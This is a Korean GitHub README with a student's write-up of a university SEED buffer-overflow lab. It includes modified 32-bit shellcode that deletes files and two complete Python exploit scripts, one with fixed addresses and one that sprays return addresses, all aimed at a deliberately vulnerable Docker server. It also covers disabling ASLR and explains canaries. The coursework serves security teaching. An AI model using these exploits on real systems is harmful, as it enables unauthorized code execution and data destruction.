# EEC4412 Buffer-Overflow Attack Lab

2025년 2학기 인하대학교 전기전자공학부 <a href="https://abeek.inha.ac.kr/01_prof/01_portfolio/PlanPrintInfo.aspx?CurrSeq=155546&ViewState=N">EEC4412 정보보호론</a> 수업의 Buffer-Overflow Attack Lab 과제 풀이가 담긴 저장소입니다.
<br><br>
온라인에 공개된 "<a href="https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Server/Buffer_Overflow_Server.pdf">SEED Labs - Buffer Overflow Attack Lab (Server Version)</a>" 문제를 일부 변형하여 출제되었습니다. 실습 환경 코드는 <a href="https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Server/Labsetup.zip">이 링크</a>에 방문하면 볼 수 있습니다.
<br><br>
실습은 Google Cloud Compute Engine e2-small x86_64, Ubuntu 20.04를 사용하여 진행되었습니다.

## Lab 환경 설정
본 실습 시작 전에 Address randomization countermeasure를 비활성화 해주었습니다. 이를 비활성화 하지 않으면 버퍼 오버플로우 공격을 하기 어렵기 때문에 과제에서 비활성화 할 것을 요구하고 있습니다.<br>
`$ sudo /sbin/sysctl -w kernel.randomize_va_space=0`<br><br>
<img width="896" height="74" alt="image" src="https://github.com/user-attachments/assets/15111aa6-c6da-4922-9c27-8b18818f352c" />
<br><br>
공격 대상 서버는 docker-compose.yml 파일을 통해 제공되고 있습니다. 이를 이용해 컨테이너를 띄워줬습니다.<br><br>
<img width="958" height="403" alt="image" src="https://github.com/user-attachments/assets/99a93f47-b894-4592-ac0c-31472c90ce0f" />

## Task 1: Shellcode 익히기
> Task 1 (2점). 임의의 파일을 삭제할 수 있도록 쉘 코드를 변경하라. 수정한 코드의 스크린샷을 리포트에 첨부하라.
- 풀이 코드
  - <a href="https://github.com/Yun-YeoJun/EEC4412-Buffer-Overflow-Attack-Lab/blob/main/shellcode/shellcode_32.py">shellcode/shellcode_32.py</a>
<br>
변경 전 원본 shellcode/shellcode_32.py의 모습은 아래와 같습니다.<br><br>
<img width="953" height="875" alt="image" src="https://github.com/user-attachments/assets/93b8a309-1c8d-4d99-9f34-7467a492c6db" />
<br><br>
여기서 "/bin/ls -l; echo hello 32; /bin/tail -n 2 /etc/passwd      *" 부분을 변경해주면 원하는 명령이 실행되도록 만들 수 있습니다.
<br><br>
그래서 아래와 같이 수정해 주었습니다. 매개변수로 target 파일 주소를 받고, 이를 삭제하는 명령을 변수 cmd에 담았습니다. 그리고 shellcode 변수에 cmd 변수의 값을 넣어줬습니다.<br><br>
<img width="750" height="659" alt="image" src="https://github.com/user-attachments/assets/472e0c48-fd5d-4d9f-82e0-6e5ce3b2869f" />
<br><br>
실행 결과는 아래와 같습니다. shellcode 바이너리를 생성하기 위해 `./shellcode_32.py`를 실행하면서 'test'를 매개변수로 넣어줬습니다. 정상적으로 삭제 명령이 동작함을 확인하기 위해 'test' 파일을 `touch test`로 만들어주고, './a32.out'을 실행해 보았습니다. 이를 실행하니 'test' 이름을 가진 파일이 삭제되었음을 확인할 수 있습니다.<br><br>
<img width="934" height="713" alt="image" src="https://github.com/user-attachments/assets/48ba1108-7e48-41d4-b114-15de5fd133ab" />

## Task 2: Level-1 공격
> Task 2 (10점). exploit.py를 이용하여 Server 1을 공격하라. 공격에 사용한 코드를 제시하고 설명해라. 어떠한 쉘 코드를 수행하였는지 설명하고, 이에 대한 증명을 스크린샷으로 보고서에 첨부하라.
- 풀이 코드
  - <a href="https://github.com/Yun-YeoJun/EEC4412-Buffer-Overflow-Attack-Lab/blob/main/attack-code/exploit.py">attack-code/exploit.py</a>
<br>
Server 1에 정상적으로 요청을 보내면 다음과 같은 로그가 컨테이너에 남습니다.<br><br>
<img width="1040" height="384" alt="image" src="https://github.com/user-attachments/assets/cbc9698a-5726-4d65-af0b-4e79082b9c72" />
<br><br>
서버의 프로그램이 정상적으로 반환되면 "Returned Properly"라는 메시지가 출력됩니다. 만약 이 메시지가 출력되지 않는다면, stack 프로그램이 크래시된 것이라고 생각할 수 있습니다.<br><br>

위 컨테이너 로그를 보면 버퍼 오버플로우 공격에 핵심적인 두 가지 정보를 확인할 수 있습니다. Frame pointer의 값과 버퍼의 주소를 확인할 수 있습니다. 위 스크린샷에서는 ebp는 '0xffffd5b8', 버퍼 주소는 '0xffffd548'임을 확인할 수 있습니다. 여기서 ebp는 x86 아키텍처에서 frame pointer register를 가리키는 이름입니다. x64 아키텍처에서는 rbp라고 합니다.<br><br>

이러한 정보를 바탕으로 아래와 같이 공격 코드를 작성해줬습니다. (attack-code/exploit.py)<br><br>
```python
#!/usr/bin/python3
import sys

cmd = f"/bin/echo EXPLOIT!; /bin/ls -alR;                         *"

shellcode = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   +cmd+
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload

buf = 0xffffd548
ebp = 0xffffd5b8

ret    = buf + start     # Change this number 
offset = ebp + 4 - buf  # Change this number 

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```
<br>
공격 페이로드에 넣은 쉘 코드는 이전 문제에서 사용한 쉘 코드를 가져와서 일부 변형했습니다. 만약 공격이 성공했을 경우 서버에 echo 명령어와 ls 명령어가 실행되도록 설정해 주었습니다. 공격자가 원하는 다른 명령어를 적어줘도 됩니다.<br><br>
start 변수의 값은 입력의 최대 길이가 517이므로, 거기서 shellcode 변수의 길이 만큼을 뺀 값으로 설정해 줬습니다. 이는 페이로드의 맨 끝에 쉘 코드를 배치하려고 했기 때문입니다.<br><br>
offset 변수를 보면 ebp + 4 - buf로 설정해주고 있는 것을 볼 수 있습니다. 서버에서는 buf 주소부터 데이터를 복사하기 때문에 content 에서 0번 인덱스는 buf 주소를 가리킵니다. 그래서 ebp + 4 주소는 content 에서 ebp + 4 - buf 인덱스를 가집니다. offset 값을 이렇게 설정해주고 이 위치에 ret 값을 넣어주면, 정확히 return address에 우리가 실행하기를 원하는 쉘 코드의 주소 buf + start를 덮어쓸 수 있습니다.<br><br>

실행 결과는 아래와 같습니다. 컨테이너의 로그를 보면 "EXPLOIT!"이라는 문자열과 `ls -alR` 명령어의 결과가 잘 뜨는 것을 확인할 수 있습니다. 즉, 공격자가 원하는 명령어가 실행되었음을 확인할 수 있습니다.<br><br>
<img width="1215" height="639" alt="image" src="https://github.com/user-attachments/assets/1756ccf9-37c9-465c-bbb5-6407a6998596" />

## Task 3: Level-2 공격
> Task 3 (6점). 버퍼의 크기가 [100, 300]으로 주어졌을 때 버퍼오버플로우 공격을 수행하는 payload를 만들어라. 단, 해당 범위 버퍼 사이즈에 모두 대응하는 하나의 payload를 작성해야 한다. 브루트 포스 등의 방법을 이용하는 경우 점수는 없다. 왜냐하면 더 많은 공격 시도를 할수록 상대방에게 발각 당하고 상대방이 대응할 가능성이 커지기 때문이다. 따라서 공격의 횟수를 줄이며 공격하는 것이 중요하다. 보고서에는 어떠한 방법을 이용해서 공격했는지 설명하고, 공격에 성공한 증거를 제시하고, 코드를 포함하라. Canary value와의 연관성을 설명하라.
- 풀이 코드
  - <a href="https://github.com/Yun-YeoJun/EEC4412-Buffer-Overflow-Attack-Lab/blob/main/attack-code/exploit-level2.py">attack-code/exploit-level2.py</a>
<br>
이번 Task에서는 서버 로그에 버퍼의 주소 값만 출력됩니다. 이전 문제와 달리 ebp 값은 알 수 없습니다. 그렇기 때문에 이전 Task 보다 공격하기가 어려워졌습니다. 아래 스크린 샷을 보면 버퍼의 주소가 `0xffffd078` 임을 알 수 있습니다.<br><br>
<img width="910" height="208" alt="image" src="https://github.com/user-attachments/assets/3744447b-529e-4e91-b978-f1c6e982fd65" />
<br><br>
문제에서 힌트를 주었는데, 32-bit 시스템 기준으로 frame pointer에 저장된 값은 언제나 4의 배수라는 정보입니다. 이러한 정보들을 바탕으로 아래와 같이 공격 코드를 작성해 주었습니다. (attack-code/exploit-level2.py)<br><br>

```python
#!/usr/bin/python3
import sys

cmd = f"/bin/echo EXPLOIT!; /bin/ls -alR;                         *"

shellcode = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   +cmd+
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode
print("start = ", start)

# Decide the return address value 
# and put it somewhere in the payload

buf = 0xffffd078

ret    = buf + start     # Change this number 

# Use 4 for 32-bit address and 8 for 64-bit address

offset = 0
while (offset + 4 < start):
    content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
    offset += 4

##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```
<br>
이전 Task에서 사용한 exploit.py 파일을 일부 수정해 공격 코드를 만들었습니다.<br><br>

offset 변수의 값을 0부터 시작해 4씩 증가시키면서 content의 내용을 ret 주소로 설정해 주었습니다. 왜냐하면 문제에서 힌트로 준 것처럼 32-bit 시스템 기준으로 frame pointer에 저장된 값은 언제나 4의 배수이고, buf 값도 4의 배수이기 때문입니다. 이렇게 return address가 될 수 있는 모든 곳에 쉘 코드의 주소를 넣어주면 버퍼의 크기를 모르더라도 공격자가 원하는 쉘 코드를 return address로 설정할 수 있다.<br><br>

또한 위 코드의 start의 값은 381인데, 이는 버퍼의 최대 크기인 300보다 큰 값이기 때문에 버퍼 오버플로우 공격을 하기에 문제가 없는 쉘 코드 길이다.<br><br>

실행 결과는 아래와 같다. echo 명령과 ls 명령이 정상적으로 실행된 것을 볼 수 있다. 즉, 공격이 성공한 것을 볼 수 있다.<br><br>
<img width="1054" height="559" alt="image" src="https://github.com/user-attachments/assets/30579546-94e7-4cc5-a793-1831645d63a0" />
<br><br>

이 Task에서는 버퍼의 크기가 정확히 주어지지 않았습니다. 그래서 공격을 위해 페이로드 앞 부분에 쉘 코드의 실행 주소를 계속 넣어주면서 return address가 될 수 있는 모든 곳의 데이터를 쉘 코드의 주소로 설정해 주었습니다. 이러한 공격을 Canary value를 사용하면 막을 수 있습니다. Canary value는 프레임 포인터와 버퍼 사이에 존재하는 임의의 문자열을 말하는데, 이 문자열의 손상 여부를 통해 버퍼 오버플로우 발생 여부를 판단할 수 있습니다. 지금은 서버 프로그램 컴파일 과정에서 Canary value 옵션을 꺼두었기 때문에 위와 같은 공격이 성공할 수 있었지만, Canary value 옵션을 켜두고 컴파일 한 뒤 다시 공격하면 Canary value가 손상되고, 이로 인해 버퍼 오버플로우를 감지할 수 있기 때문에 공격이 실패하게 됩니다.

## Task 4: Address Randomization
> Task 4 (2점). 본 과제의 처음에 우리는 버퍼 오버플로우 대응책들을 비활성화 한 채로 시작했다. 이번에는 해당 대응책을 다시 활성화 한 후에 실험을 진행한다. 아래의 명령어를 가상 머신에서 수행하여 Address Space Layout Randomization (ASLR)을 활성화 한다. 아래의 명령어는 global 하게 적용되기 때문에 컨테이너에도 적용되는 것을 알 수 있다.<br>
> `$ sudo /sbin/sysctl -w kernel.randomize_va_space=2`<br>
> Server-1에 hello 신호를 보내 보고, 서버의 아웃풋을 관측해라. 해당 신호를 여러 번 반복해서 보내 보아라. 어떠한 특징이 있는가. 이것이 우리의 공격을 어렵게 만드는 이유에 대해서 설명하라.
<br>

설정을 바꾸고 hello 신호를 5번 보냈습니다.<br><br>
<img width="932" height="273" alt="image" src="https://github.com/user-attachments/assets/cb4923f9-72d9-4954-8883-d3beba3772d0" />
<br><br>
서버에 찍힌 로그는 아래와 같습니다.<br><br>
<img width="765" height="610" alt="image" src="https://github.com/user-attachments/assets/0b88f4ea-6b85-48b2-b2bb-c69629e27328" />
<br><br>
ebp와 버퍼 주소가 요청을 보낼 때마다 바뀌는 것을 볼 수 있습니다.<br><br>
지금까지의 공격은 ebp와 버퍼 주소가 고정되어 있다고 가정하고 수행했습니다. 그런데 이렇게 요청을 보낼 때마다 ebp와 버퍼 주소가 바뀌면 이전과 동일한 방식으로 공격할 수 없습니다. 왜냐하면 이전에는 페이로드를 만들 때 고정된 ebp와 버퍼 주소를 기반으로 만들었기 때문입니다. 이렇게 요청할 때마다 ebp와 버퍼 주소가 동적으로 결정된다면 이전과 동일한 방식으로는 공격할 수 없습니다.
